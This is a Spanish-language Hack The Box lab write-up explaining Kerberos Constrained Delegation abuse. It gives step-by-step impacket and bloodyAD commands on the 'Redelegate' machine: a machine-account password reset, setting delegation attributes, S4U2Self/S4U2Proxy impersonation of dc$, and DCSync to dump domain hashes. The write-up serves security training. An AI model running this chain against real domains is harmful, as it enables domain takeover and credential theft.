---
title: "Constrained Delegation Attack"
date: 2026-03-12
categories:
  - Hack The Box
  - Windows
tags:
  - Active Directory
  - Kerberos
  - Constrained Delegation
  - S4U2Proxy
  - S4U2Self
  - DCSync
  - Privilege Escalation
  - MSSQL
  - RID Cycling
  - Windows
layout: single
author_profile: true
show_date: true
toc: true
---

## ¿Qué es Constrained Delegation?

Constrained Delegation es una característica de Kerberos que permite a un objeto de AD (usuario o computadora) solicitar tickets de servicio en nombre de otro usuario, pero limitado a servicios específicos previamente configurados. A diferencia de Unconstrained Delegation donde el objeto puede impersonar a cualquier usuario hacia cualquier servicio, aquí el scope está restringido a los SPNs definidos en `msDS-AllowedToDelegateTo`.

El mecanismo detrás usa dos extensiones de Kerberos:

- **S4U2Self** — permite al objeto obtener un ticket de servicio hacia sí mismo en nombre de cualquier usuario, sin necesitar las credenciales de ese usuario
- **S4U2Proxy** — usa ese ticket para solicitar un ticket de servicio hacia el SPN destino configurado, impersonando al usuario elegido

Para que un objeto pueda ejecutar este flujo necesita tener el flag `TRUSTED_TO_AUTH_FOR_DELEGATION` en su `userAccountControl` y al menos un SPN configurado en `msDS-AllowedToDelegateTo`.

## ¿Cuándo es explotable?

El ataque se vuelve interesante en dos escenarios principales:

El primero es cuando ya tienes control sobre un objeto que tiene Constrained Delegation configurado — simplemente abusas de lo que ya está ahí impersonando a un usuario privilegiado hacia el SPN configurado.

El segundo, y más poderoso, es cuando tienes permisos para **modificar los atributos de delegación** de un objeto. Si puedes escribir sobre `msDS-AllowedToDelegateTo` y activar `TRUSTED_TO_AUTH_FOR_DELEGATION`, puedes configurar la delegación tú mismo desde cero y dirigirla hacia donde quieras.

El privilegio que habilita esto es `SeEnableDelegationPrivilege` — con él puedes modificar estos atributos en objetos sobre los que además tienes Full Control.

## A quién impersonar

Un error común es intentar impersonar directamente a `Administrator`. Esto falla frecuentemente porque Administrator puede estar en el grupo **Protected Users** o tener el flag `AccountNotDelegated`, lo que hace que el KDC rechace el S4U2Proxy con `KDC_ERR_BADOPTION`.

La alternativa más efectiva es impersonar una **machine account** privilegiada — por ejemplo la machine account del DC (`dc$`). Las machine accounts raramente tienen esas protecciones y con un ticket CIFS del DC impersonando a `dc$` tienes suficiente para ejecutar DCSync y obtener todos los hashes del dominio.

## El flujo general del ataque

```
1. Obtener TGT del usuario con permisos
2. Cambiar password del objeto objetivo (si tienes Full Control sobre él)
3. Activar TRUSTED_TO_AUTH_FOR_DELEGATION en su userAccountControl
4. Configurar msDS-AllowedToDelegateTo con el SPN destino
5. getST → S4U2Self + S4U2Proxy impersonando la cuenta objetivo
6. Usar el ticket para DCSync o acceso directo
```

---

## Demostración — Redelegate


En esta máquina el escenario fue exactamente el segundo caso: tenía permisos para configurar la delegación desde cero.

**Lo que tenía con helen.frost:**

- Sesión WinRM en el DC

- `SeEnableDelegationPrivilege`

[![](/assets/images/190.png)](/assets/images/190.png)

- Full Control sobre el objeto `FS01$`

[![](/assets/images/191.png)](/assets/images/191.png)

## Paso 1 — TGT de Helen via Kerberos

Todas las operaciones de bloodyAD deben ir autenticadas con el TGT de Kerberos, no con usuario y password directamente. El DC solo acepta modificaciones de atributos sensibles como `TRUSTED_TO_AUTH_FOR_DELEGATION` cuando el contexto de autenticación es Kerberos con un ticket que tiene `SeEnableDelegationPrivilege`

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/redelegate/content]
└─$ impacket-getTGT redelegate.vl/helen.frost:'newP@ssword2026' -dc-ip 10.129.234.50
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in helen.frost.ccache

┌──(kali㉿kali)-[~/Desktop/HTB/redelegate/content]
└─$ export KRB5CCNAME=helen.frost.ccache 
```

`getTGT` le pide al KDC un Ticket Granting Ticket para Helen. Este ticket es la identidad Kerberos de Helen y lo que hace que el DC acepte las modificaciones posteriores — sin él, bloodyAD autenticaría via NTLM y el DC rechazaría los cambios en atributos sensibles como `TRUSTED_TO_AUTH_FOR_DELEGATION` porque ese privilegio solo se evalúa correctamente en el contexto Kerberos. Con `export KRB5CCNAME` le digo a todas las herramientas que usen ese ccache como identidad activa.


## Paso 2 — Cambiar password de FS01$


```bash
┌──(kali㉿kali)-[~/Desktop/HTB/redelegate/content]
└─$ bloodyAD -d redelegate.vl -k --host "dc.redelegate.vl" set password 'FS01$' 'Password1!'
[+] Password changed successfully!
```

`-d` especifica el dominio, `-k` le dice a bloodyAD que use el TGT del `KRB5CCNAME` activo en lugar de usuario/password, y `--host` apunta al DC por hostname (no IP) porque Kerberos requiere resolución de nombres. El comando cambia la password de `FS01$` — como Helen tiene Full Control sobre ese objeto en AD, tiene permiso para hacerlo. Necesito conocer la password de FS01$ para poder autenticarme como esa machine account en los pasos siguientes.


## Paso 3 — Activar TRUSTED_TO_AUTH_FOR_DELEGATION


```bash
┌──(kali㉿kali)-[~/Desktop/HTB/redelegate/content]
└─$ bloodyAD -d redelegate.vl -k --host "dc.redelegate.vl" add uac 'FS01$' -f TRUSTED_TO_AUTH_FOR_DELEGATION
[-] ['TRUSTED_TO_AUTH_FOR_DELEGATION'] property flags added to FS01$'s userAccountControl
```

`add uac` modifica el atributo `userAccountControl` del objeto y `-f TRUSTED_TO_AUTH_FOR_DELEGATION` agrega ese flag específico sin tocar los demás flags existentes. Este flag es el que le dice al KDC que `FS01$` está autorizado para ejecutar S4U2Self — sin él el KDC rechaza directamente cualquier intento de delegación. Solo funciona porque Helen tiene `SeEnableDelegationPrivilege`.

## Paso 4 — Configurar msDS-AllowedToDelegateTo


```bash
┌──(kali㉿kali)-[~/Desktop/HTB/redelegate/content]
└─$ bloodyAD -d redelegate.vl -k --host "dc.redelegate.vl" set object 'FS01$' msDS-AllowedToDelegateTo -v 'cifs/dc.redelegate.vl'
[+] FS01$'s msDS-AllowedToDelegateTo has been updated
```

`set object` modifica un atributo LDAP directamente sobre el objeto `FS01$`, en este caso `msDS-AllowedToDelegateTo`. El valor `cifs/dc.redelegate.vl` es el SPN hacia el que FS01$ podrá delegar — básicamente le estoy diciendo al KDC "FS01$ tiene permitido obtener tickets CIFS del DC en nombre de otros usuarios". El case importa aquí, tiene que ir en minúscula tal como está registrado en AD o el KDC no lo reconoce.

## Paso 5 — S4U2Self + S4U2Proxy


```bash
┌──(kali㉿kali)-[~/Desktop/HTB/redelegate/content]
└─$ unset KRB5CCNAME

┌──(kali㉿kali)-[~/Desktop/HTB/redelegate/content]
└─$ impacket-getST redelegate.vl/'FS01$':'Password1!' \
  -spn cifs/dc.redelegate.vl \
  -impersonate dc \
  -dc-ip 10.129.234.50

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating dc
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in dc@cifs_dc.redelegate.vl@REDELEGATE.VL.ccache
```

Primero hago `unset KRB5CCNAME` para que getST no intente usar el ticket de Helen sino que se autentique directamente como `FS01$` con la password que acabamos de setear. `-spn` es el servicio destino hacia el que quiero el ticket, `-impersonate dc` es la cuenta que voy a impersonar — elijo la machine account `dc$` y no `Administrator` porque las machine accounts no tienen protecciones contra delegación. Internamente getST ejecuta S4U2Self para obtener un ticket de `FS01$` hacia sí mismo impersonando a `dc$`, y luego S4U2Proxy para convertir ese ticket en uno válido para `cifs/dc.redelegate.vl`. El resultado es un ccache con ese service ticket listo para usar.

## Paso 6 — DCSync

[![](/assets/images/192.png)](/assets/images/192.png)

Seteo el ccache generado en el paso anterior como identidad activa. `-k` le dice a secretsdump que use Kerberos, `-no-pass` porque la autenticación va por el ticket no por password, y `-just-dc-ntlm` para extraer solo los hashes NTLM via DRSUAPI — que es el protocolo de replicación de AD que usan los Domain Controllers entre sí. Como el ticket nos identifica como `dc$` impersonando al DC real, tenemos permisos de replicación y podemos pedir todos los hashes del dominio. Con el hash NTLM de Administrator tenemos acceso total al DC via Pass-the-Hash.
